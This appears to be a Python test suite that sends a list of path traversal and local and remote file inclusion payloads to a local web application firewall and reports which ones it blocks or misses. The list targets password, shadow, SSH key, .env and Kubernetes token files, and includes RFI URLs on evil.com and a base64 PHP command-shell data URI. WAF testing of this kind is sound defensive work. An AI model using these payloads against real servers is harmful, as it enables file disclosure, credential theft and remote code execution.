#!/usr/bin/env python3
"""
Path Traversal & File Inclusion Attack Test Suite
Tests LFI/RFI and directory traversal techniques against the WAF
"""

import requests
import json
import time
from typing import Dict

WAF_API = "http://localhost:3001/api/waf/check"

# Path Traversal & File Inclusion Payloads
PATH_TRAVERSAL_ATTACKS = [
    # Basic Path Traversal
    {"name": "Basic ../", "path": "/api/file", "query": {"name": "../../../etc/passwd"}},
    {"name": "Double ../", "path": "/api/read", "query": {"file": "....//....//....//etc/passwd"}},
    {"name": "Triple encoded", "path": "/api/load", "query": {"path": "..%252f..%252f..%252fetc/passwd"}},
    {"name": "Absolute path", "path": "/api/view", "query": {"doc": "/etc/passwd"}},
    {"name": "Mixed slashes", "path": "/api/get", "query": {"resource": "..\\..\\..\\etc\\passwd"}},

    # URL Encoding Bypasses
    {"name": "URL encoded ../", "path": "/api/download", "query": {"file": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"}},
    {"name": "Double URL encode", "path": "/api/fetch", "query": {"path": "%252e%252e%252f%252e%252e%252fetc/passwd"}},
    {"name": "UTF-8 encoding", "path": "/api/open", "query": {"name": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"}},
    {"name": "16-bit Unicode", "path": "/api/access", "query": {"file": "..%u2215..%u2215etc/passwd"}},
    {"name": "Overlong UTF-8", "path": "/api/content", "query": {"doc": "%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd"}},

    # Null Byte Injection
    {"name": "Null byte bypass", "path": "/api/image", "query": {"file": "../../../etc/passwd%00.jpg"}},
    {"name": "Null byte extension", "path": "/api/document", "query": {"name": "....//....//etc/passwd%00.pdf"}},
    {"name": "Encoded null byte", "path": "/api/media", "query": {"src": "../../../etc/shadow%2500.png"}},

    # Windows Paths
    {"name": "Windows traversal", "path": "/api/file", "query": {"name": "..\\..\\..\\windows\\system32\\config\\SAM"}},
    {"name": "Windows hosts", "path": "/api/config", "query": {"file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"}},
    {"name": "Windows boot.ini", "path": "/api/system", "query": {"path": "C:\\boot.ini"}},
    {"name": "UNC path", "path": "/api/share", "query": {"file": "\\\\attacker\\share\\evil.exe"}},
    {"name": "Windows short name", "path": "/api/legacy", "query": {"doc": "..\\..\\..\\PROGRA~1\\"}},

    # Sensitive File Targets
    {"name": "Linux passwd", "path": "/api/users", "query": {"list": "../../../etc/passwd"}},
    {"name": "Linux shadow", "path": "/api/auth", "query": {"db": "../../../etc/shadow"}},
    {"name": "SSH private key", "path": "/api/key", "query": {"file": "../../../root/.ssh/id_rsa"}},
    {"name": "SSH authorized_keys", "path": "/api/ssh", "query": {"auth": "../../../root/.ssh/authorized_keys"}},
    {"name": "Bash history", "path": "/api/logs", "query": {"log": "../../../root/.bash_history"}},
    {"name": "Proc self", "path": "/api/info", "query": {"data": "../../../proc/self/environ"}},
    {"name": "Proc cmdline", "path": "/api/debug", "query": {"info": "/proc/self/cmdline"}},

    # Web Server Configs
    {"name": "Apache config", "path": "/api/conf", "query": {"file": "../../../etc/apache2/apache2.conf"}},
    {"name": "Nginx config", "path": "/api/settings", "query": {"config": "../../../etc/nginx/nginx.conf"}},
    {"name": "PHP config", "path": "/api/php", "query": {"ini": "../../../etc/php/7.4/apache2/php.ini"}},
    {"name": "MySQL config", "path": "/api/db", "query": {"conf": "../../../etc/mysql/my.cnf"}},

    # Application Configs
    {"name": "Web.config", "path": "/api/dotnet", "query": {"config": "../../../web.config"}},
    {"name": "App settings", "path": "/api/app", "query": {"settings": "../../../appsettings.json"}},
    {"name": "Environment file", "path": "/api/env", "query": {"file": "../../../.env"}},
    {"name": "Docker secrets", "path": "/api/secrets", "query": {"path": "../../../run/secrets/db_password"}},
    {"name": "Kubernetes tokens", "path": "/api/k8s", "query": {"token": "../../../var/run/secrets/kubernetes.io/serviceaccount/token"}},

    # Remote File Inclusion (RFI)
    {"name": "RFI HTTP", "path": "/api/include", "query": {"page": "http://evil.com/shell.txt"}},
    {"name": "RFI HTTPS", "path": "/api/template", "query": {"tpl": "https://evil.com/backdoor.php"}},
    {"name": "RFI FTP", "path": "/api/remote", "query": {"file": "ftp://evil.com/malware.php"}},
    {"name": "RFI data URI", "path": "/api/load", "query": {"src": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="}},
    {"name": "RFI PHP filter", "path": "/api/read", "query": {"file": "php://filter/convert.base64-encode/resource=index.php"}},
    {"name": "RFI PHP input", "path": "/api/exec", "query": {"page": "php://input"}},
    {"name": "RFI expect", "path": "/api/cmd", "query": {"run": "expect://id"}},

    # Log Poisoning Paths
    {"name": "Apache access log", "path": "/api/logs", "query": {"file": "../../../var/log/apache2/access.log"}},
    {"name": "Apache error log", "path": "/api/errors", "query": {"log": "../../../var/log/apache2/error.log"}},
    {"name": "Nginx access log", "path": "/api/nginx", "query": {"access": "../../../var/log/nginx/access.log"}},
    {"name": "SSH auth log", "path": "/api/ssh", "query": {"log": "../../../var/log/auth.log"}},
    {"name": "Mail log", "path": "/api/mail", "query": {"log": "../../../var/log/mail.log"}},
    {"name": "Proc fd", "path": "/api/fd", "query": {"file": "../../../proc/self/fd/0"}},

    # Wrapper Protocols
    {"name": "File wrapper", "path": "/api/protocol", "query": {"uri": "file:///etc/passwd"}},
    {"name": "Dict wrapper", "path": "/api/dict", "query": {"lookup": "dict://attacker:11111/"}},
    {"name": "Gopher wrapper", "path": "/api/gopher", "query": {"url": "gopher://localhost:6379/_INFO"}},
    {"name": "Zip wrapper", "path": "/api/archive", "query": {"file": "zip://uploads/evil.zip#shell.php"}},
    {"name": "Phar wrapper", "path": "/api/phar", "query": {"file": "phar://uploads/evil.phar/shell.php"}},

    # Filter Bypass Techniques
    {"name": "Double dot bypass", "path": "/api/bypass", "query": {"file": "....//....//....//etc/passwd"}},
    {"name": "Dot dot slash variations", "path": "/api/bypass", "query": {"path": "..././..././..././etc/passwd"}},
    {"name": "URL encode dots", "path": "/api/bypass", "query": {"name": "%2e%2e/%2e%2e/%2e%2e/etc/passwd"}},
    {"name": "Mixed encoding", "path": "/api/bypass", "query": {"file": "..%c0%af..%c0%af..%c0%afetc/passwd"}},
    {"name": "Truncation", "path": "/api/bypass", "query": {"doc": "../../../etc/passwd" + "A" * 4096}},

    # Hidden in legitimate requests
    {"name": "Image path LFI", "path": "/api/avatar", "query": {"img": "../../../../../../etc/passwd"}},
    {"name": "Template LFI", "path": "/api/render", "body": {"template": "../../../etc/passwd", "data": {}}},
    {"name": "Export path LFI", "path": "/api/export", "body": {"format": "pdf", "source": "../../../etc/shadow"}},
]

def test_payload(attack: Dict) -> Dict:
    """Test a single path traversal payload against WAF"""
    payload = {
        "method": "POST" if "body" in attack else "GET",
        "path": attack["path"],
        "query_params": attack.get("query", {}),
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*"
        }
    }

    body = attack.get("body")
    if body:
        payload["body"] = json.dumps(body) if isinstance(body, dict) else body

    try:
        response = requests.post(WAF_API, json=payload, timeout=10)
        result = response.json()
        return {
            "name": attack["name"],
            "detected": result.get("is_anomaly", False),
            "score": result.get("anomaly_score", 0),
            "time_ms": result.get("processing_time_ms", 0)
        }
    except Exception as e:
        return {"name": attack["name"], "error": str(e)}

def main():
    print("=" * 70)
    print("PATH TRAVERSAL & FILE INCLUSION ATTACK TEST SUITE")
    print("=" * 70)
    print(f"Testing {len(PATH_TRAVERSAL_ATTACKS)} LFI/RFI/traversal payloads...\n")

    detected = 0
    missed = 0
    errors = 0

    for i, attack in enumerate(PATH_TRAVERSAL_ATTACKS, 1):
        result = test_payload(attack)

        if "error" in result:
            status = "\033[93m[ERROR]\033[0m"
            errors += 1
        elif result["detected"]:
            status = "\033[92m[BLOCKED]\033[0m"
            detected += 1
        else:
            status = "\033[91m[MISSED]\033[0m"
            missed += 1

        score = result.get("score", 0)
        print(f"[{i:02d}/{len(PATH_TRAVERSAL_ATTACKS)}] {status} {result['name'][:40]:<40} Score: {score:.4f}")
        time.sleep(0.05)

    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Total Tests:  {len(PATH_TRAVERSAL_ATTACKS)}")
    print(f"\033[92mBlocked:      {detected}\033[0m")
    print(f"\033[91mMissed:       {missed}\033[0m")
    print(f"\033[93mErrors:       {errors}\033[0m")
    detection_rate = detected / (len(PATH_TRAVERSAL_ATTACKS) - errors) * 100 if (len(PATH_TRAVERSAL_ATTACKS) - errors) > 0 else 0
    print(f"Detection Rate: {detection_rate:.1f}%")
    print("=" * 70)

if __name__ == "__main__":
    main()
